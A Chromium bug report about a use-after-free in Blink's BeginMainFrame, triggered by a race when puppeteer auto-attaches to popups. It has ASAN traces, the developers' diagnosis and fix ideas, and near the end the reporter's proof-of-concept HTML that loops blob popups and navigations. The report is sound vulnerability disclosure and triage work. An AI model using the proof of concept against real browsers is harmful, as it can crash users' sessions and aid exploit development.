# UAF in blink::WidgetBase::BeginMainFrame(base::TimeTicks)

| Field | Value |
|-------|-------|
| **Issue ID** | [40061620](https://issues.chromium.org/issues/40061620) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Internals>Frames, Platform>DevTools, UI>Browser>Navigation |
| **Platforms** | Linux |
| **Reporter** | em...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2022-11-06 |
| **Bounty** | $1,500.00 |

## Description

**Steps to reproduce the problem:**  

os version:ubuntu 22.04  

chromium version:  

[1]Chromium 108.0.5359.10  

[2]Chromium 109.0.5406.0(gs://chromium-browser-asan/linux-release/asan-linux-release-1067909.zip)

repro steps:  

[1] install pepper  

export PUPPETEER\_SKIP\_CHROMIUM\_DOWNLOAD=true  

npm install puppeteer  

[2] run custom http server  

python3 -m http.server 8605 --dir=/home/pwn11/test  

[3] run node to luanch chromium browser  

node /home/pwn11/test/test.js  

[4] click poc.html in page directory list. And you will immediately repro the uaf issue.

According to asan information, this is an issue related to race, and the reproduction is unstable without pepteer.

**Problem Description:**  

==3497477==ERROR: AddressSanitizer: heap-use-after-free on address 0x618000003098 at pc 0x5579077e2d6e bp 0x7ffd6c86ba40 sp 0x7ffd6c86ba38  

READ of size 8 at 0x618000003098 thread T0 (chrome)  

#0 0x5579077e2d6d in BeginMainFrame ./../../third\_party/blink/renderer/platform/widget/widget\_base.cc:904:5  

#1 0x5579077e2d6d in non-virtual thunk to blink::WidgetBase::BeginMainFrame(base::TimeTicks) ./../../third\_party/blink/renderer/platform/widget/widget\_base.cc:0:0  

#2 0x5578fd4e8736 in cc::ProxyMain::BeginMainFrame(std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>) ./../../cc/trees/proxy\_main.cc:259:21  

#3 0x5578fd506509 in Invoke<void (cc::ProxyMain::\*)(std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > ./../../base/functional/bind\_internal.h:647:12  

#4 0x5578fd506509 in MakeItSo<void (cc::ProxyMain::\*)(std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), std::Cr::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > > ./../../base/functional/bind\_internal.h:848:5  

#5 0x5578fd506509 in void base::internal::Invoker<base::internal::BindState<void (cc::ProxyMain::\*)(std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>), base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>>, void ()>::RunImpl<void (cc::ProxyMain::\*)(std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>), std::Cr::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>>, 0ul, 1ul>(void (cc::ProxyMain::\*&&)(std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>), std::Cr::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState, std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);)>>&&, std::Cr::integer\_sequence<unsigned long, 0ul, 1ul>) ./../../base/functional/bind\_internal.h:920:12  

#6 0x5578f7e56b5e in Run ./../../base/functional/callback.h:145:12  

#7 0x5578f7e56b5e in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task\_annotator.cc:133:32  

#8 0x5578f7ea5358 in RunTask<(lambda at ../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:443:29)> ./../../base/task/common/task\_annotator.h:72:5  

#9 0x5578f7ea5358 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow\*) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:441:21  

#10 0x5578f7ea42d2 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:297:30  

#11 0x5578f7ea67da in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:0:0  

#12 0x5578f7d3e289 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:40:55  

#13 0x5578f7ea742b in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:600:12  

#14 0x5578f7dd6ac3 in base::RunLoop::Run(base::Location const&) ./../../base/run\_loop.cc:141:14  

#15 0x55790f9988f2 in content::RendererMain(content::MainFunctionParams) ./../../content/renderer/renderer\_main.cc:313:16  

#16 0x5578f6985f6c in content::RunOtherNamedProcessTypeMain(std::Cr::basic\_string<char, std::Cr::char\_traits<char>, std::Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:752:14  

#17 0x5578f69887de in content::ContentMainRunnerImpl::Run() ./../../content/app/content\_main\_runner\_impl.cc:1104:10  

#18 0x5578f6980047 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner\*) ./../../content/app/content\_main.cc:342:36  

#19 0x5578f69806f7 in content::ContentMain(content::ContentMainParams) ./../../content/app/content\_main.cc:370:10  

#20 0x5578e6836aba in ChromeMain ./../../chrome/app/chrome\_main.cc:175:12  

#21 0x7fd115aa2d8f in \_\_libc\_start\_call\_main ./csu/../sysdeps/nptl/libc\_start\_call\_main.h:58:16

0x618000003098 is located 24 bytes inside of 824-byte region [0x618000003080,0

**Additional Comments:**

\*\*Chrome version: \*\* 108.0.5359.10 \*\*Channel: \*\* Not sure

**OS:** Linux

## Attachments

- [test.js](attachments/test.js) (text/plain, 551 B)
- [poc.html](attachments/poc.html) (text/plain, 488 B)
- [asan.log](attachments/asan.log) (text/plain, 30.0 KB)

## Timeline

### em...@gmail.com (2022-11-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-06)

[Empty comment from Monorail migration]

### em...@gmail.com (2022-11-06)

I'm sorry. I found misspellings in my report, the correct spelling is "puppeteer".

### wf...@chromium.org (2022-11-09)

Thank you for your report. It's not obvious to me why puppeteer would make any difference here. I'll see what clusterfuzz thinks.

### cl...@chromium.org (2022-11-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5195289054085120.

### wf...@chromium.org (2022-11-09)

I see this is a race, and I have not yet been able to reproduce it, but the ASAN stack looks legit.

creis -> do you know who might be able to look at this? My random guess is that as chrome-extension://xxxx navigates to the error page, the close() takes effect at the same time (somehow?) and this might cause the UAF?

[Monorail components: UI>Browser>Navigation]

### em...@gmail.com (2022-11-09)

I tried many times with normal way to repro it, but repro race is very low.So I think CF can not repro this issue. Use puppeteer will immediately repro this issue. Asan log does not related to any devtools api,I'm not sure what's the diffrent yet.

### wf...@chromium.org (2022-11-09)

puppeteer command line options are

https://github.com/puppeteer/puppeteer/blob/main/packages/puppeteer-core/src/node/ChromeLauncher.ts

--allow-pre-commit-input --disable-background-networking --enable-features=NetworkServiceInProcess2 --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=Translate,BackForwardCache,AcceptCHFrame,AvoidUnnecessaryBeforeUnloadCheckSync --disable-hang-monitor --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-sync --force-color-profile=srgb --metrics-recording-only --no-first-run --enable-automation --password-store=basic --use-mock-keychain --enable-blink-features=IdleDetection --export-tagged-pdf

--disable-popup-blocking is needed for the blob popup.

I still can't repro though, but perhaps with those arguments someone will have better luck?

### wf...@chromium.org (2022-11-09)

re: #7 can you repro without puppet but with command line args from #8? If so, maybe it's because I am trying repro on Windows, and I will try Linux.

### cr...@chromium.org (2022-11-09)

I'm not sure about this code, and dcheng@ might be more familiar with what happens in Blink when you try to close a window while navigations are in progress.

[Monorail components: Blink]

### em...@gmail.com (2022-11-09)

I can't repro with above command line.
tested version(Chromium 109.0.5406.0)
ubuntu 22.04

### wf...@chromium.org (2022-11-09)

I can reproduce if I use puppeteer. I still don't know what difference that makes. I also repro back to 106.0.5249.0. dcheng - can you help diagnose what might be happening here?

### [Deleted User] (2022-11-09)

[Empty comment from Monorail migration]

### wf...@chromium.org (2022-11-09)

I tried this with a dcheck asan build (ty for the idea, dtapuska) and I hit this:

2650043:1:1109/222931.821702:FATAL:render_frame_impl.cc(2088)] Check failed: !base::RunLoop::IsNestedOnCurrentThread(). 

   #0 0x5626a46d9c42 in base::debug::CollectStackTrace(void**, unsigned long) ./../../base/debug/stack_trace_posix.cc:879:7
    #1 0x5626a43d2373 in StackTrace ./../../base/debug/stack_trace.cc:221:12
    #2 0x5626a43d2373 in base::debug::StackTrace::StackTrace() ./../../base/debug/stack_trace.cc:218:28
    #3 0x5626a44257d7 in logging::LogMessage::~LogMessage() ./../../base/logging.cc:718:29
    #4 0x5626a4427ace in logging::LogMessage::~LogMessage() ./../../base/logging.cc:712:27
    #5 0x5626b97e3eb2 in content::RenderFrameImpl::Unload(bool, mojo::StructPtr<blink::mojom::FrameReplicationState>, base::TokenType<blink::RemoteFrameTokenTypeMarker> const&, mojo::StructPtr<blink::mojom::RemoteFrameInterfacesFromBrowser>, mojo::StructPtr<blink::mojom::RemoteMainFrameInterfaces>) ./../../content/renderer/render_frame_impl.cc:2088:3
    #6 0x5626965576d6 in content::mojom::FrameStubDispatch::Accept(content::mojom::Frame*, mojo::Message*) ./gen/content/common/frame.mojom.cc:2924:13
    #7 0x5626a518127c in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1002:54
    #8 0x5626a51a1a4d in mojo::MessageDispatcher::Accept(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #9 0x5626a5186e56 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:694:20
    #10 0x5626a6139d51 in IPC::(anonymous namespace)::ChannelAssociatedGroupController::AcceptOnEndpointThread(mojo::Message) ./../../ipc/ipc_mojo_bootstrap.cc:1080:24
    #11 0x5626a612ec0e in Invoke<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message> ./../../base/functional/bind_internal.h:646:12
    #12 0x5626a612ec0e in MakeItSo<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), std::Cr::tuple<scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message> > ./../../base/functional/bind_internal.h:825:12
    #13 0x5626a612ec0e in RunImpl<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), std::Cr::tuple<scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message>, 0UL, 1UL> ./../../base/functional/bind_internal.h:919:12
    #14 0x5626a612ec0e in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:870:12
    #15 0x5626a4575efb in Run ./../../base/functional/callback.h:174:12
    #16 0x5626a4575efb in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:154:32
    #17 0x5626a45f396e in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:450:11)> ./../../base/task/common/task_annotator.h:84:5
    #18 0x5626a45f396e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:448:23
    #19 0x5626a45f1d6d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:299:30
    #20 0x5626a45f5385 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #21 0x5626a444a624 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:40:55
    #22 0x5626a45f6635 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:605:12
    #23 0x5626a44f4c9b in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:141:14
    #24 0x5626b0238614 in content::(anonymous namespace)::NestedMessageLoopRunnerImpl::Run() ./../../content/child/blink_platform_impl.cc:87:14
    #25 0x5626b58b15cd in blink::ClientMessageLoopAdapter::RunLoop(blink::WebLocalFrameImpl*) ./../../third_party/blink/renderer/core/exported/web_dev_tools_agent_impl.cc:169:20
    #26 0x5626b59be306 in blink::WebViewImpl::Show(base::TokenType<blink::LocalFrameTokenTypeMarker> const&, blink::NavigationPolicy, gfx::Rect const&, gfx::Rect const&, bool) ./../../third_party/blink/renderer/core/exported/web_view_impl.cc:2978:33
    #27 0x5626b36c530d in blink::ChromeClientImpl::Show(blink::LocalFrame&, blink::LocalFrame&, blink::NavigationPolicy, blink::mojom::blink::WindowFeatures const&, bool) ./../../third_party/blink/renderer/core/page/chrome_client_impl.cc:369:14
    #28 0x5626b3723e2b in blink::CreateNewWindow(blink::LocalFrame&, blink::FrameLoadRequest&, WTF::AtomicString const&) ./../../third_party/blink/renderer/core/page/create_window.cc:391:27
    #29 0x5626b375e37c in blink::FrameTree::FindOrCreateFrameForNavigation(blink::FrameLoadRequest&, WTF::AtomicString const&) const ./../../third_party/blink/renderer/core/page/frame_tree.cc:217:13
    #30 0x5626b075caf6 in blink::LocalDOMWindow::open(v8::Isolate*, WTF::String const&, WTF::AtomicString const&, WTF::String const&, blink::ExceptionState&) ./../../third_party/blink/renderer/core/frame/local_dom_window.cc:2214:26
    #31 0x5626bc3e42e0 in blink::(anonymous namespace)::v8_window::OpenOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) ./gen/third_party/blink/renderer/bindings/modules/v8/v8_window.cc:14399:39
    #32 0x562696ae4f84 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) ./../../v8/src/api/api-arguments-inl.h:146:3
    #33 0x562696ae14c6 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, unsigned long*, int) ./../../v8/src/builtins/builtins-api.cc:112:36
    #34 0x562696adcfaf in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:143:5
    #35 0x562696adb9c0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:130:1

I note it's going via third_party/blink/renderer/core/exported/web_dev_tools_agent_impl.cc so adding platform>devtools component. This might explain why this only hits with puppeteer at least?

dcheng, I'm reliably informed that this is your area of expertise: would you mind taking a closer look?

[Monorail components: Platform>DevTools]

### dt...@chromium.org (2022-11-09)

[Empty comment from Monorail migration]

[Monorail components: -Blink Blink>Internals>Frames]

### [Deleted User] (2022-11-10)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dc...@chromium.org (2022-11-10)

OK, after far too much flailing around.

- This is specific to having devtools active.
- From wfh's stack, I should have immediately just looked at the source. Instead I spent some time flailing around with the debugger / stack tracing trying to figure out how to get the entry point into v8.
- But the problem isn't the caller into v8; the problem is already on the stack. Showing a new window calls WebDevToolsAgentImpl::DidShowNewWindow(): https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/exported/web_view_impl.cc;l=2978;drc=9d6c47424433c371ea0a498d430133ba6ad82b2d
- This runs a nested loop, presumably so new messages can arrive and be processed even though we're in the middle of 

At this point, we have reentrancy and chaos ensues (I hit several other DCHECKs while trying to debug this, such as  DCHECK(!frame_->GetPage()->Paused()); in DocumentLoader::BodyDataReceivedImpl; I would link this but code search is busted for line+revision links for some files).

I can't quite answer *why* this causes UaFs for BeginMainFrame, but message reordering causes general chaos. The free stack is actually a bit illuminating:

0x618000003898 is located 24 bytes inside of 824-byte region [0x618000003880,0x618000003bb8)
freed by thread T0 (chrome) here:
    #0 0x561291906f3d in operator delete(void*) _asan_rtl_:3
    #1 0x5612ad7a0b07 in operator() ./../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:49:5
    #2 0x5612ad7a0b07 in reset ./../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:281:7
    #3 0x5612ad7a0b07 in blink::WebFrameWidgetImpl::Close() ./../../third_party/blink/renderer/core/frame/web_frame_widget_impl.cc:339:16
    #4 0x5612ad80850a in blink::WebLocalFrameImpl::Close() ./../../third_party/blink/renderer/core/frame/web_local_frame_impl.cc:798:20
    #5 0x5612b46b4d2c in content::RenderFrameImpl::FrameDetached() ./../../content/renderer/render_frame_impl.cc:3559:11
    #6 0x5612ad84f656 in blink::LocalFrameClientImpl::Detached(blink::FrameDetachType) ./../../third_party/blink/renderer/core/frame/local_frame_client_impl.cc:351:11
    #7 0x5612ac64c23a in blink::Frame::Detach(blink::FrameDetachType) ./../../third_party/blink/renderer/core/frame/frame.cc:160:12
    #8 0x5612ac655479 in blink::Frame::SwapImpl(blink::WebFrame*, mojo::PendingAssociatedRemote<blink::mojom::blink::RemoteFrameHost>, mojo::PendingAssociatedReceiver<blink::mojom::blink::RemoteFrame>) ./../../third_party/blink/renderer/core/frame/frame.cc:776:8
    #9 0x5612ac65758b in blink::Frame::Swap(blink::WebRemoteFrame*, mojo::PendingAssociatedRemote<blink::mojom::blink::RemoteFrameHost>, mojo::PendingAssociatedReceiver<blink::mojom::blink::RemoteFrame>) ./../../third_party/blink/renderer/core/frame/frame.cc:737:10
    #10 0x5612ac6497b7 in blink::WebFrame::Swap(blink::WebRemoteFrame*, blink::CrossVariantMojoAssociatedRemote<blink::mojom::RemoteFrameHostInterfaceBase>, blink::CrossVariantMojoAssociatedReceiver<blink::mojom::RemoteFrameInterfaceBase>, mojo::StructPtr<blink::mojom::FrameReplicationState>) ./../../third_party/blink/renderer/core/frame/web_frame.cc:42:34
    #11 0x5612b469536f in content::RenderFrameImpl::SwapOutAndDeleteThis(bool, mojo::StructPtr<blink::mojom::FrameReplicationState>, base::TokenType<blink::RemoteFrameTokenTypeMarker> const&, mojo::StructPtr<blink::mojom::RemoteFrameInterfacesFromBrowser>, mojo::StructPtr<blink::mojom::RemoteMainFrameInterfaces>) ./../../content/renderer/render_frame_impl.cc:4042:15
    #12 0x5612b469489a in content::RenderFrameImpl::Unload(bool, mojo::StructPtr<blink::mojom::FrameReplicationState>, base::TokenType<blink::RemoteFrameTokenTypeMarker> const&, mojo::StructPtr<blink::mojom::RemoteFrameInterfacesFromBrowser>, mojo::StructPtr<blink::mojom::RemoteMainFrameInterfaces>) ./../../content/renderer/render_frame_impl.cc:2104:8
    #13 0x5612964d88d4 in content::mojom::FrameStubDispatch::Accept(content::mojom::Frame*, mojo::Message*) ./gen/content/common/frame.mojom.cc:2923:13
    #14 0x5612a27da76b in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:994:54
    #15 0x5612a27f04c7 in mojo::MessageDispatcher::Accept(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #16 0x5612a27dee29 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:693:20
    #17 0x5612a34cf906 in IPC::(anonymous namespace)::ChannelAssociatedGroupController::AcceptOnEndpointThread(mojo::Message) ./../../ipc/ipc_mojo_bootstrap.cc:1080:24
    #18 0x5612a34c7cfd in Invoke<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message> ./../../base/functional/bind_internal.h:646:12
    #19 0x5612a34c7cfd in MakeItSo<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), std::Cr::tuple<scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message> > ./../../base/functional/bind_internal.h:825:12
    #20 0x5612a34c7cfd in RunImpl<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), std::Cr::tuple<scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message>, 0UL, 1UL> ./../../base/functional/bind_internal.h:919:12
    #21 0x5612a34c7cfd in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:870:12
    #22 0x5612a1d0d4b9 in Run ./../../base/functional/callback.h:174:12
    #23 0x5612a1d0d4b9 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:134:32
    #24 0x5612a1d54b1c in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:450:11)> ./../../base/task/common/task_annotator.h:81:5
    #25 0x5612a1d54b1c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:448:23
    #26 0x5612a1d53ada in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:299:30
    #27 0x5612a1d55f94 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #28 0x5612a1c0d3a3 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:40:55
    #29 0x5612a1d56d09 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:605:12
    #30 0x5612a1c9a08e in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:141:14
    #31 0x5612ac44f943 in content::(anonymous namespace)::NestedMessageLoopRunnerImpl::Run() ./../../content/child/blink_platform_impl.cc:87:14
    #32 0x5612b0ca1e5d in blink::WebViewImpl::Show(base::TokenType<blink::LocalFrameTokenTypeMarker> const&, blink::NavigationPolicy, gfx::Rect const&, gfx::Rect const&, bool) ./../../third_party/blink/renderer/core/exported/web_view_impl.cc:2978:33
    #33 0x5612aefca416 in blink::ChromeClientImpl::Show(blink::LocalFrame&, blink::LocalFrame&, blink::NavigationPolicy, blink::mojom::blink::WindowFeatures const&, bool) ./../../third_party/blink/renderer/core/page/chrome_client_impl.cc:369:14
    #34 0x5612af0223e7 in blink::CreateNewWindow(blink::LocalFrame&, blink::FrameLoadRequest&, WTF::AtomicString const&) ./../../third_party/blink/renderer/core/page/create_window.cc:391:27
    #35 0x5612af055be6 in blink::FrameTree::FindOrCreateFrameForNavigation(blink::FrameLoadRequest&, WTF::AtomicString const&) const ./../../third_party/blink/renderer/core/page/frame_tree.cc:217:13
    #36 0x5612ac85da1b in blink::LocalDOMWindow::open(v8::Isolate*, WTF::String const&, WTF::AtomicString const&, WTF::String const&, blink::ExceptionState&) ./../../third_party/blink/renderer/core/frame/local_dom_window.cc:2214:26

So you can see that we're in the middle of showing a new window... but we're randomly processing some other IPCs in the middle, which leads to badness. The IPC that's being processed in the middle is *probably* the attempt to navigate to chrome-extension://xxxx. That probably commits while devtools is waiting, so the browser tells the renderer to swap out the main frame to a remote frame (the actual navigation results in an error page which commits in another renderer process).

I don't quite know what cleanup ends up getting skipped so that we end up running the task, or how that task normally prevents UaFing since I'm not familiar with the compositor. The task trace for the BeginMainFrame task that ends up UaFing is this:

task_backtrace = {__elems_ = {0xc001c0ded017d00d, 0x56420232d734 <cc::ProxyImpl::ScheduledActionSendBeginMainFrame(viz::BeginFrameArgs const&)+1780>, 0x56420231ddb8 <cc::ProxyMain::SendCommitRequestToImplThreadIfNeeded(cc::ProxyMain::CommitPipelineStage)+328>, 0x56420b8c8566 <blink::MainThreadEventQueue::SetNeedsMainFrame()+758>, 
    0x5641fde32c5b <mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int)+763>, 0x0, 0x0, 0xd00d1d1d178119}}

Finally a few notes about poc.html:
- The open() call in the PoC can be simplified to: open('about:blank', '', 'width=500, height=500');
- I ended up using a local asan build so I could enable/disable dchecks and experiment. The path to the binary in test.js needs to be updated to reflect that.
- Similarly, I had issues with `const url = '...'` in poc.html as provided. I had to change that to point to / of the http server I was running to serve poc.html.

(and for the reporter, I always recommend including the asan free stack if it produces one. It's often quite useful)

### dc...@chromium.org (2022-11-10)

jarin@, I am assigning to you as the "lucky" recipient. I am hoping that for the particular case of attaching devtools to a new popup, we can try to avoid pumping general IPCs. I am not sure if that is easily possible though.

Another thing that would help inform the severity of this bug is whether this requires enabling "Auto-open devtools for popups" or if simply opening devtools is sufficient to be problematic.

### ja...@chromium.org (2022-11-11)

[Empty comment from Monorail migration]

### ja...@chromium.org (2022-11-11)

Given caseq@'s comment from the discussion on go/chrome-devtools:instrumentation-pause-design (see the end of this comment for the quote), I believe that this UAF is not possible to trigger even with DevTools, only with puppeteer/CDP. 

As dcheng@ observed, we run waitForDebugger nested loop when opening popups to automatically attach the debugging protocol browser client. If the nested message loop handles an Unload request, we will free the web frame widget, but there is already a task sitting in the queue for that widget.

Let me capture some ideas about possible fixes:

One possible fix would be running the waitForDebugger message loop in some restricted mode (similar to go/chrome-devtools:instrumentation-pause-design), so that navigation is blocked while we are waiting. This requires some additional work beyond the design outlined in the design doc because the set of messages that need to be handled during the waitForDebugger pause is larger than what we need for the instrumentation pause.

Some other ideas to explore (I am not an expert here - the ideas might be silly):

1. run waitForDebugger at some later point, when it is safe to detach/close the frame.

2. make the subsequent tasks (such as the BeginMainFrame task) resilient against the frame being deleted.

Both of these ideas seem tricky to implement. I am skeptical about (2) because there are likely many places that would need some tracking of validity and a lot of defensive checks. For (1), the question is if there is such a good point before we run anything interesting on the frame.


Excerpt from caseq's comment on go/chrome-devtools:instrumentation-pause-design: "... window.open() is a special case, we do run nested message loop there -- this is because some stuff happens synchronously as the parent execution context handles window.open(), yet it's a separate target, so we need the client to attach there. You could not reproduce this with the front-end because the front-end does not use that code path (as you can see, we're using the browser target in the test). The auto-attach to newly opened window is  currently only used by the automation clients, the front-end uses a mechanism external to CDP to deal with these (this eventually would have to be fixed, though)."

### em...@gmail.com (2022-11-11)

I remember that in the beginning, I reproduced uaf several times without using puppet. I don't know what the reason is, it can never be reproduced.
After seeing https://crbug.com/chromium/1381871#c20(https://bugs.chromium.org/p/chromium/issues/detail?id=1381871#c20), I'm not sure whether the uafs were the same at that time. Because I thought they were the same at that time, I didn't continue to process symbolic confirmation.
The following is the method I tested at the time.It may not be very helpful, but you can refer to it.

./chrome http://localhost:8001/main.html --user-data-dir=/tmp/xx --disble-popup-blocking --remote-debugging-port=9000
Although the '--remote-debugging-port' flag was used, I did not use another browser to connect it.
main.html
<iframe src="./crash.html"></iframe>
<iframe src="./crash.html"></iframe>
<iframe src="./crash.html"></iframe>
<iframe src="./crash.html"></iframe>
<script type="text/javascript">
  setTimeout(function(){
    location.reload()
  },1000)
</script>
crash.html
<script type="text/javascript">
        setInterval(() => {
            for (let i = 0; i < 5; i++) {
                location = 'chrome-extension://xxxx'
                w = open(URL.createObjectURL(new Blob(["<script>" + `close();` + "</" + "script>"], { type: 'text/html' })), '', 'width=500,height=500')
            }
        }, 100);
</script>


### ja...@chromium.org (2022-11-11)

Thank you for the clarification, this is helpful!

